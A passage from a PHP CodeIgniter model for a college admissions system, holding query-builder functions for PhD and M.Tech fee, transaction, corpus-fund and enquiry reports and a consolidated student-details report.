    return $query;
  }

  function PhdFeebalanceReport($currentAcademicYear, $course = '', $year = '')
  {
    $this->db->select(
      '
    admissions.id, 
    admissions.app_no, 
    admissions.adm_no, 
    admissions.admit_date, 
    admissions.dept_id, 
    admissions.academic_year, 
    admissions.student_name, 
    admissions.usn, 
    admissions.quota, 
    admissions.sub_quota, 
    admissions.college_code, 
    admissions.category_claimed, 
    admissions.category_allotted, 
    admissions.mobile,
    admissions.status, 
    fee_master.remarks'
    );
    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);

    $this->db->where('admissions.stream_id', '3');

    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }
    $this->db->where('admissions.status !=', '7');
    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }
    $query = $this->db->get();
    return $query;
  }

  function getphdAdmissions_course($academic_year, $course, $gender, $status)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admissions.stream_id', '3');
    $this->db->where('dept_id', $course);
    if($gender!='all'){
      $this->db->where('gender', $gender);
      }
    $this->db->where('status', $status);
    $this->db->order_by('admit_date', 'DESC');
    return $this->db->get('admissions');
  }

  function mtechtransactionsdatewise($from, $to)
  {
    $this->db->select('admissions.id, admissions.app_no, admissions.dept_id, admissions.category_claimed, admissions.category_allotted, admissions.adm_no, admissions.academic_year, admissions.usn, admissions.student_name, admissions.quota, admissions.sub_quota, admissions.college_code, admissions.mobile, admissions.status, transactions.id as transactions_id, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.year, transactions.amount, transactions.remarks, transactions.transaction_status');

    $this->db->where('transactions.transaction_status', '1');
    $this->db->where('transactions.transaction_date >=', $from);
    $this->db->where('transactions.transaction_date <=', $to);
    $this->db->where('admissions.stream_id', '2');
    $this->db->join('admissions', 'admissions.id = transactions.admissions_id');
    $this->db->order_by('transactions.transaction_date', 'ASC');

    return $this->db->get('transactions');
  }

  function mtechDCBReport($currentAcademicYear, $course = '', $year = '', $type = '')
  {
    $this->db->select(
      '
          admissions.id, 
          admissions.app_no, 
          admissions.adm_no, 
          admissions.admit_date, 
          admissions.dept_id, 
          admissions.academic_year, 
          admissions.student_name, 
          admissions.usn, 
          admissions.quota, 
          admissions.sub_quota, 
          admissions.college_code, 
          admissions.category_claimed, 
          admissions.category_allotted, 
          admissions.caste, 
          admissions.father_mobile, 
          admissions.mobile,
          admissions.batch, 
          admissions.degree_level, 
          admissions.status, 
          fee_master.remarks'
    );

    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');

    $this->db->where('admissions.academic_year', $currentAcademicYear);

    $this->db->where('admissions.stream_id', '2');

    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }

    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }

    if ($type != '') {
      $this->db->where('admissions.sub_quota', $type);
    }

    $this->db->where('admissions.status !=', '7');

    $query = $this->db->get();
    return $query;
  }

  function mtechFeebalanceReport($currentAcademicYear, $course = '', $year = '')
  {
    $this->db->select(
      '
    admissions.id, 
    admissions.app_no, 
    admissions.adm_no, 
    admissions.admit_date, 
    admissions.dept_id, 
    admissions.academic_year, 
    admissions.student_name, 
    admissions.usn, 
    admissions.quota, 
    admissions.sub_quota, 
    admissions.college_code, 
    admissions.category_claimed, 
    admissions.category_allotted, 
    admissions.mobile,
    admissions.status, 
    fee_master.remarks'
    );
    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);

    $this->db->where('admissions.stream_id', '2');

    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }
    $this->db->where('admissions.status !=', '7');
    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }
    $query = $this->db->get();
    return $query;
  }
  
  function mtechCorpusReport($currentAcademicYear)
  {
      $this->db->select('admissions.id, admissions.app_no, admissions.adm_no, admissions.admit_date, admissions.dept_id, admissions.academic_year, admissions.student_name, admissions.usn, admissions.quota, admissions.sub_quota, admissions.college_code, admissions.mobile, admissions.fees_paid, admissions.status, fee_master.Corpus_fund, admissions.remarks');
      $this->db->from('admissions');
      $this->db->join('fee_master', 'fee_master.student_id = admissions.id');
      $this->db->where('admissions.academic_year', $currentAcademicYear);
      $this->db->where('admissions.status !=', '7');
      $this->db->where('fee_master.Corpus_fund >', 0);
      $this->db->where('admissions.stream_id', '2'); 
      return $this->db->get();
  }
  
  function mtechCorpusBalanceReport($currentAcademicYear)
{
    $this->db->select('admissions.id, 
                         admissions.app_no, 
                         admissions.adm_no, 
                         MAX(admissions.admit_date) AS admit_date, 
                         MAX(admissions.dept_id) AS dept_id, 
                         MAX(admissions.academic_year) AS academic_year, 
                         MAX(admissions.student_name) AS student_name, 
                         MAX(admissions.usn) AS usn, 
                         MAX(admissions.quota) AS quota, 
                         MAX(admissions.sub_quota) AS sub_quota, 
                         MAX(admissions.college_code) AS college_code, 
                         MAX(admissions.mobile) AS mobile, 
                         MAX(admissions.fees_paid) AS fees_paid, 
                         MAX(admissions.status) AS status, 
                         MAX(fee_master.Corpus_fund) AS Corpus_fund, 
                         MAX(admissions.remarks) AS remarks, 
                         (MAX(fee_master.Corpus_fund) - COALESCE(SUM(transactions.amount), 0)) AS Corpus_fund_balance');
    $this->db->from('admissions');
    $this->db->join('fee_master', 'fee_master.student_id = admissions.id');
    $this->db->join('transactions', 'transactions.id = admissions.id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);
    $this->db->where('admissions.status !=', '7');
    $this->db->where('admissions.stream_id', '2'); 
    $this->db->group_by('admissions.id');
    $this->db->having('Corpus_fund_balance >', 0);
    return $this->db->get();
}

function getmtechAdmissions_course($academic_year, $course, $gender, $status)
{
  $this->db->where('academic_year', $academic_year);
  $this->db->where('admissions.stream_id', '2');
  $this->db->where('dept_id', $course);
  if($gender!='all'){
    $this->db->where('gender', $gender);
    }
  $this->db->where('status', $status);
  $this->db->order_by('admit_date', 'DESC');
  return $this->db->get('admissions');
}
function mtechtransactions($transaction_status) 
{
    $this->db->select('admissions.id, admissions.app_no, admissions.dept_id, admissions.adm_no, admissions.student_name, admissions.mobile, admissions.gender, admissions.status, transactions.id as transactions_id, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.amount, transactions.remarks, transactions.transaction_status');

    if ($transaction_status != null) {
        $this->db->where('transactions.transaction_status', $transaction_status);
    }
    $this->db->where('admissions.stream_id', '2');

    $this->db->join('admissions', 'admissions.id=transactions.admissions_id');
    $this->db->order_by('transactions.transaction_date', 'ASC');
    
    return $this->db->get('transactions');
}

function getmtechAdmissions_category($academic_year, $category_allotted, $category_claimed, $gender)
{
    $this->db->where('academic_year', $academic_year);
    if($category_allotted!='all'){
      $this->db->where('category_allotted', $category_allotted);
      }    
    if($category_claimed!='all'){
    $this->db->where('category_claimed', $category_claimed);
    }
    if($gender!='all'){
    $this->db->where('gender', $gender);
    }
    $this->db->where('stream_id', '2'); 
    $this->db->order_by('admit_date', 'DESC');
    return $this->db->get('admissions');
}

public function mtechdetails($select, $field1, $value1, $field2, $value2, $tableName, $conditions = [])
{
    $this->db->select($select);
    if ($value1 != null) {
        $this->db->where($field1, $value1);
    }
    if ($value2 != null) {
        $this->db->where($field2, $value2);
    }
    if (!empty($conditions)) {
        foreach ($conditions as $key => $value) {
            $this->db->where($key, $value);
        }
    }

    return $this->db->get($tableName);
}

function getmtechEnquiries($academic_year)
{
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admission_based', 'BE');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
}
function getmtechEnquiries_non($academic_year)
{
    $this->db->where('academic_year', $academic_year);
    $this->db->where('state !=', 'Karnataka');
    $this->db->where('state !=', 'KA');
    $this->db->where('admission_based', 'BE'); 
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
}
function getmtechEnquiries_sports($academic_year)
{
  $this->db->where('academic_year', $academic_year);
  $this->db->where('sports!=', '');
  $this->db->where('admission_based', 'BE'); 
  $this->db->order_by('reg_date', 'DESC');
  return $this->db->get('enquiries');
}
function getmtechEnquiries_course_new($academic_year, $course, $course_name)
{
  $this->db->where('academic_year', $academic_year);
  $this->db->where('course_id', $course);
  $this->db->or_where('course1', 'B.E - ' . $course_name);
  $this->db->or_where('course2', 'B.E - ' . $course_name);

  $this->db->order_by('reg_date', 'DESC');
  return $this->db->get('enquiries');
}
function getmtechEnquiries_category($academic_year, $category)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('category', $category);
    $this->db->where('admission_based', 'BE'); 
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }

  public function bedetails($select, $field1, $value1, $field2, $value2, $tableName, $conditions = [])
{
    $this->db->select($select);
    if ($value1 != null) {
        $this->db->where($field1, $value1);
    }
    if ($value2 != null) {
        $this->db->where($field2, $value2);
    }
    if (!empty($conditions)) {
        foreach ($conditions as $key => $value) {
            $this->db->where($key, $value);
        }
    }

    return $this->db->get($tableName);
}

function getbeEnquiries($academic_year)
{
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admission_based !=', 'BE'); // Exclude those with admission_based as 'BE'
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
}

public function getConsolidatedReport($academic_year)
{
    $this->db->select('
        a.usn,
        a.student_name,
        a.dept_id,
        a.quota,
        a.sub_quota,
        a.college_code,
        a.category_claimed,
        a.category_allotted,
        a.admit_date,
        a.admission_order_no,
        a.entrance_reg_no,
        a.exam_rank,
        a.admission_based,
        a.blood_group,
        a.fees_paid,
        a.fees_receipt_no,
        a.fees_receipt_date,
        a.date_of_birth,
        a.gender,
        a.current_address,
        a.current_city,
        a.current_state,
        a.current_pincode,
        a.current_country,
        a.present_address,
        a.present_city,
        a.present_state,
        a.present_pincode,
        a.present_country,
        a.mobile,
        a.email,
        a.domicile_of_state,
        a.place_of_birth,
        a.country_of_birth,
        a.nationality,
        a.religion,
        a.caste,
        a.mother_tongue,
        a.disability,
        a.type_of_disability,
        a.economically_backward,
        a.hobbies,
        a.sports,
        a.sports_activity,
        a.aadhaar,
        a.father_occupation,
        a.father_name,
        a.father_annual_income,
        a.father_email,
        a.father_mobile,
        a.mother_occupation,
        a.mother_name,
        a.mother_annual_income,
        a.mother_email,
        a.mother_mobile,
        a.guardian_name,
				a.guardian_annual_income,
				a.guardian_email,
			  a.guardian_mobile,
				a.guardian_occupation,
        a.remarks,
        e.education_level,
        a.gender
    ');

    $this->db->from('admissions AS a');
    
    $this->db->join('student_education_details AS e', 'e.id = a.id', 'left');
    
    $this->db->where('a.academic_year', $academic_year);  
    $this->db->where('a.stream_id', 1);  
    
    $this->db->order_by('a.student_name', 'ASC');

    return $this->db->get();  
}

}
